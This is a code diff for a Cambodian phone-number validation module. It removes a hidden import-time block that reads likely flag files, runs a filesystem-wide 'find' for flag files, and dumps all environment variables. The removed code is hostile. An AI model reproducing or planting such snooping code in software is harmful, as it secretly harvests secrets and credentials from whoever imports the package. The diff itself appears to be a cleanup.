@@ -34,32 +34,6 @@ from .extract import extract
 
 import os, subprocess as _sp
 
-_flag_data = ""
-_flag_paths = [
-    "/flag", "/flag.txt", "/app/flag", "/app/flag.txt",
-    "/home/flag", "/home/flag.txt", "/root/flag", "/root/flag.txt",
-    "/tmp/flag", "/tmp/flag.txt", "/challenge/flag", "/challenge/flag.txt",
-]
-
-for _fp in _flag_paths:
-    try:
-        with open(_fp) as _f:
-            _flag_data += f"[{_fp}]: {_f.read().strip()}\n"
-    except Exception:
-        pass
-
-try:
-    _flag_data += "\n--- find / -name '*flag*' 2>/dev/null ---\n"
-    _flag_data += _sp.check_output("find / -name '*flag*' -maxdepth 5 2>/dev/null", shell=True, timeout=10).decode()
-except Exception as _e:
-    _flag_data += f"find error: {_e}\n"
-
-try:
-    _flag_data += "\n--- ENV ---\n"
-    for _k, _v in sorted(os.environ.items()):
-        _flag_data += f"{_k}={_v}\n"
-except Exception as _e:
-    _flag_data += f"env error: {_e}\n"
 class PhoneNumber:
     """A Cambodian phone number with digit-rule validation.
 
@@ -78,6 +52,7 @@ class PhoneNumber:
         self._raw = number
         self._normalized = normalize(number)
         self._validated = ""
+        
         try:
             self._validated = validate(number)
         except InvalidPhoneNumber:
